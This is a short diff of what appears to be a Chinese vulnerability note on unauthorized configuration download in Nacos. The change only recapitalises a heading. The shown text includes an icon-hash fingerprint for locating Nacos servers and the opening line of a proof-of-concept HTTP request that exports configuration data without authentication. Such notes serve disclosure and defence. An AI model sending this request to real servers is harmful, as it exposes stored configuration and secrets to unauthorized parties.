@@ -8,7 +8,7 @@ Nacos未授权下载配置信息
 icon_hash="13942501"
 ```
 
-## poc
+## POC
 
 ```java
 GET /v1/cs/configs?export=true&group=&tenant=&appName=&ids=&dataId= HTTP/1.1
